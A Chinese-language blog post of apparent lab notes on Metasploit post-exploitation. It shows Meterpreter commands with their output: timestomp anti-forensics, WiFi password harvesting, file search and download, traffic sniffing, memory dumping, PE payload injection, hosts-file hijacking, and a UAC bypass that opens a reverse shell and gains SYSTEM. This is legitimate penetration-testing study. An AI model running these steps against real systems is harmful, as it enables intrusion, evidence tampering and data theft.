# MasterMsf 8 Metasploit的扩展功能

## 启程

> Don't be afraid to steal, just steal the right stuff.

本章将研究Metasploit的扩展功能和post模块的核心部分。

## 其他后渗透基础命令

顾名思义，“后渗透”就是我们已经成功渗透目标系统后的阶段。书中这一章的内容与前面的章节（[MasterMsf 1 走近Metasploit渗透测试框架](https://wohin.me/metasploit/2018/10/19/masterMsf-chp1.html)和[MasterMsf 2 定制Metasploit Part 3](https://wohin.me/metasploit/2018/10/20/masterMsf-chp2-part3.html)）有些重复，我将略过这些部分。

#### 获取机器ID

```
meterpreter > machine_id
[+] Machine ID: 187f7d28d552e498196177df97a6d114
```

#### 计算目标系统闲置时间

```
meterpreter > idletime
User has been idle for: 28 secs
```

（从而在用户不怎么使用计算机的时候发动攻击）

#### getsystem

这里想要说的是getsystem在新的Windows中不太稳定，最好使用本地提权模块来达到目的。（如对于`Windows Server 2008 SP1`可以尝试`exploit/windows/local/ms10_015_kitrap0d`提权）

#### timestomp

```
meterpreter > timestomp --help
Usage: timestomp <file(s)> OPTIONS
OPTIONS:
    -a <opt>  Set the "last accessed" time of the file
    -b        Set the MACE timestamps so that EnCase shows blanks
    -c <opt>  Set the "creation" time of the file
    -e <opt>  Set the "mft entry modified" time of the file
    -f <opt>  Set the MACE of attributes equal to the supplied file
    -h        Help banner
    -m <opt>  Set the "last written" time of the file
    -r        Set the MACE timestamps recursively on a directory
    -v        Display the UTC MACE values of the file
    -z <opt>  Set all four attributes (MACE) of the file
```

这是一个和计算机取证有关的很有意思的命令，目标计算机上有一个bof-server.exe，我们将其时间改为2017年：

![Bildschirmfoto 2018-10-30 um 9.47.53 PM.png]({{ site.url }}/images/metasploit/58BE08E8C01D26D98A77C37EDE96011D.png)

然后到目标系统上看一下，修改成功了：

![Bildschirmfoto 2018-10-30 um 9.49.18 PM.png]({{ site.url }}/images/metasploit/60AA531EAB556FA634E6E13799A6B72F.png)

## 其他后渗透模块

模块太多，还需要自己深入挖掘。这里展示一些有意思的。

#### 无线网络相关

```bash
# 收集附近的无线网络信息
meterpreter > run post/windows/wlan/wlan_bss_list

[*] WlanAPI Handle Closed Successfully

# 收集wifi密码
meterpreter > run post/windows/wlan/wlan_profile

[*] No wireless interfaces
```

上面显示我的虚拟机附近没有无线网络，这是正常的。。

#### 获取应用程序列表

```bash
meterpreter > run get_application_list

Installed Applications
======================

 Name                                                                                    Version
 ----                                                                                    -------
 010 Editor 6.0.2 (32-bit)
 7-Zip 9.20
 Alternate DLL Analyzer 1.540
 Cheat Engine 6.7
 Compuware SoftICE v4.3.2.2485 & IceExt 0.70 Lite Edition
 HashCheck Shell Extension (x86-32)                                                      2.1.11.1
 HashTab 6.0.0.28                                                                        6.0.0.28
 Hotfix for Microsoft .NET Framework 3.5 SP1 (KB953595)                                  1
 Hotfix for Windows XP (KB954550-v5)                                                     5
```

#### 获取环境变量

```
meterpreter > run get_env
[*] Getting all System and User Variables

Enviroment Variable list
========================

 Name                    Value
 ----                    -----
 APPDATA                 C:\Documents and Settings\Administrator\Application Data
 CLIENTNAME              Console
 ComSpec                 C:\WINDOWS\system32\cmd.exe
 HOMEDRIVE               C:
 HOMEPATH                \Documents and Settings\Administrator
 NUMBER_OF_PROCESSORS    1
 OS                      Windows_NT
 PATHEXT                 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
 PROCESSOR_ARCHITECTURE  x86
 PROCESSOR_IDENTIFIER    x86 Family 6 Model 142 Stepping 9, GenuineIntel
 TEMP                    C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp
 windir                  C:\WINDOWS
```

#### 枚举服务

```
meterpreter > run post/windows/gather/enum_services

[*] Listing Service Info for matching services, please wait...
[+] New service credential detected: Alerter is running as 'NT AUTHORITY\LocalService'
[+] New service credential detected: AppMgmt is running as 'LocalSystem'
[+] New service credential detected: aspnet_state is running as 'NT AUTHORITY\NetworkService'
Services
========

 Name                                 Credentials                  Command   Startup
 ----                                 -----------                  -------   -------
 ALG                                  NT AUTHORITY\LocalService    Manual    C:\WINDOWS\System32\alg.exe
 Alerter                              NT AUTHORITY\LocalService    Disabled  C:\WINDOWS\system32\svchost.exe -k LocalService
 AppMgmt                              LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 AudioSrv                             LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 ```

#### 获取USB历史信息

```bash
meterpreter > run post/windows/gather/usb_history

[*] Running module against DESTINY-7846DE5
[*]
   A:	FDC#GENERIC_FLOPPY_DRIVE#6&1435b2e2&0&0#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}
   D:	IDE#CdRomNECVMWar_VMware_IDE_CDR10_______________1.00____#3031303030303030303030303030303030303130#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}
   F:	                                                             Disk 7a457a45
   E:	                                                             Disk 4f494d44

[*] WD Elements 25A2 USB Device
=====================================================================================
   Disk lpftLastWriteTime	                                           Unknown
             Manufacturer	                           (标准磁盘驱动器)
                    Class	                                         DiskDrive
                   Driver	       {4D36E967-E325-11CE-BFC1-08002BE10318}\0001
```

想想stuxnet是怎么进入隔离网络的。

#### 查找文件

这个功能很酷炫！假设我们获知目标系统上有一张名为`p2422196991`的机密照片，我们要获取这张照片。

```
meterpreter > search -f p2422196991.*
Found 2 results...
    c:\Documents and Settings\Administrator\Recent\p2422196991.lnk (468 bytes)
    e:\gadgets\p2422196991.jpg (1130039 bytes)
```

然后就可以下载了！

```
meterpreter > download e:\\gadgets\\p2422196991.jpg
[*] Downloading: e:\gadgets\p2422196991.jpg -> p2422196991.jpg
[*] Downloaded 1.00 MiB of 1.08 MiB (92.79%): e:\gadgets\p2422196991.jpg -> p2422196991.jpg
[*] Downloaded 1.08 MiB of 1.08 MiB (100.0%): e:\gadgets\p2422196991.jpg -> p2422196991.jpg
[*] download   : e:\gadgets\p2422196991.jpg -> p2422196991.jpg
```

或许有人想看看这张照片：

![Bildschirmfoto 2018-10-30 um 10.00.25 PM.png]({{ site.url }}/images/metasploit/E3C3424AA4D58C2DE395828611652A16.png)

## 高级扩展功能

#### 流量嗅探

```bash
meterpreter > load sniffer
Loading extension sniffer...Success.
# 列出所有接口
meterpreter > sniffer_interfaces

1 - 'VMware Accelerated AMD PCNet Adapter' ( type:0 mtu:1514 usable:true dhcp:false wifi:false )

# 开始嗅探，缓冲区大小为1000
meterpreter > sniffer_start 1 1000
[*] Capture started on interface 1 (1000 packet buffer)
# 下载流量包
meterpreter > sniffer_dump 1 xp_1.pcap
[*] Flushing packet capture buffer for interface 1...
[*] Flushed 38 packets (6192 bytes)
[*] Downloaded 100% (6192/6192)...
[*] Download completed, converting to PCAP...
[*] PCAP file written to xp_1.pcap
```

然后就可以在Wireshark中查看：

![Bildschirmfoto 2018-10-30 um 10.21.25 PM.png]({{ site.url }}/images/metasploit/D51ABD30003AE5D8F594119B1597E892.png)

#### Dump内存

```bash
meterpreter > load winpmem
Loading extension winpmem...Success.

meterpreter > dump_ram
[-] Usage: dump_ram [output_file]
meterpreter > dump_ram xp_ram.dat
[+] Driver PMEM loaded successfully
[+] Dumping 1073741824 bytes (press Ctrl-C to abort)

^C[*] Unloading driver
[-] Error running command dump_ram: Interrupt
```

这个功能有点生猛。

#### PE文件注入

向一个PE文件中注入payload。这样一来，当这个PE文件运行时，我们的payload会一起运行，很酷吧！

```bash
meterpreter > load peinjector
Loading extension peinjector...Success.

meterpreter > injectpe -p windows/exec -o cmd=calc -t bof-server.exe
[*] Generating payload
[*] Injecting Windows Execute Command into the executable bof-server.exe
[+] Successfully injected payload into the executable: bof-server.exe
```

测试：

![Bildschirmfoto 2018-10-30 um 10.35.12 PM.png]({{ site.url }}/images/metasploit/C84EDC0120E201F9B6D5F4F0A850F627.png)

参考`lib/rex/post/meterpreter/extensions/peinjector/peinjector.rb`可以了解一下它的原理。


#### host文件注入

这个也挺好玩：劫持静态域名解析。

```
msf exploit(rambo/my_dep_no) > use post/windows/manage/inject_host
msf post(windows/manage/inject_host) > set DOMAIN www.4399.com
DOMAIN => www.4399.com
msf post(windows/manage/inject_host) > set IP 172.16.56.1
IP => 172.16.56.1
msf post(windows/manage/inject_host) > set SESSION 5
SESSION => 5
msf post(windows/manage/inject_host) > exploit

[*] Inserting hosts file entry pointing www.4399.com to 172.16.56.1..
[+] Done!
[*] Post module execution completed
```

测试：

![Bildschirmfoto 2018-10-30 um 10.47.44 PM.png]({{ site.url }}/images/metasploit/32A3A0E6EE21E905243480370A22F0C2.png)

#### Bypass UAC

之前做的bypass uac都失败了。这次装了一个新的x86 Win7，来试一下：

```
msf > use exploit/windows/local/bypassuac
msf exploit(windows/local/bypassuac) > run

[*] Started reverse TCP handler on 192.168.1.101:4444
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (179779 bytes) to 192.168.1.101
[*] Meterpreter session 3 opened (192.168.1.101:4444 -> 192.168.1.101:61046) at 2018-10-30 22:58:05 +0800

meterpreter > getuid
Server username: WIN-J7CB6NT7B29\rambo
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

## 总结

这个工具越来越炫酷了。希望未来能渐渐深入了解其各种神奇操作的原理。